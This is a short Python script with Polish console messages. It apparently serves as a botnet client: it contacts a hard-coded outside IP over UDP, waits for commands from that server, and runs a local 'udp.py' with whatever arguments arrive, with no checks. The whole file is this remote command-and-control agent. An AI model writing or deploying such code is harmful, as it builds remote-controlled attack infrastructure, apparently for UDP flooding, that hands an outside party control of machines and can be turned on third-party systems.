import socket
import subprocess
import threading

def start_client(server_ip="128.204.223.120", server_port=9999):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(b"Hello from client", (server_ip, server_port))

    def listen():
        while True:
            data, _ = client_socket.recvfrom(1024)
            command = data.decode().strip()
            print(f"Otrzymano komendę: {command}")
            args = command.split()
            if args:
                subprocess.Popen(["python3", "udp.py"] + args)

    threading.Thread(target=listen, daemon=True).start()
    input("Klient działa. Naciśnij Enter, aby zakończyć.\n")

start_client()
